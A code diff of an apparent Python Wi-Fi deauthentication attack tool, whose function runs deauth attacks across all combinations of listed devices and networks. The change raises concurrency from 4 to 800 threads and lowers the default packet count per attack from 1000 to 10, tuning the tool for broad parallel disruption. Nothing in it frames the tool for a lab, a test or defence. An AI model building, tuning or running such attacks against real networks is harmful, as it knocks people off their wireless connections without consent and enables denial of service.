@@ -34,7 +34,7 @@ def run_deauth_attacks(maccy, interface, packet_count, interval):
     Run deauthentication attacks on all combinations of devices and Wi-Fi networks.
     """
     processed_combinations = set()  # Track processed combinations
-    with concurrent.futures.ThreadPoolExecutor(max_workers=4) as executor:
+    with concurrent.futures.ThreadPoolExecutor(max_workers=800) as executor:
         for wifi in maccy:
             for device in maccy:
                 if wifi == device:
@@ -53,7 +53,7 @@ def run_deauth_attacks(maccy, interface, packet_count, interval):
 def main():
     parser = argparse.ArgumentParser(description='Perform deauthentication attacks on devices connected to a Wi-Fi network.')
     parser.add_argument('-i', '--interface', type=str, default='en0', help='Network interface to use for the attack (default: en0)')
-    parser.add_argument('-c', '--count', type=int, default=1000, help='Number of deauthentication packets to send per attack (default: 1000)')
+    parser.add_argument('-c', '--count', type=int, default=10, help='Number of deauthentication packets to send per attack (default: 10)')
     parser.add_argument('-d', '--interval', type=float, default=0.1, help='Interval between deauthentication packets (default: 0.1)')
     args = parser.parse_args()
 
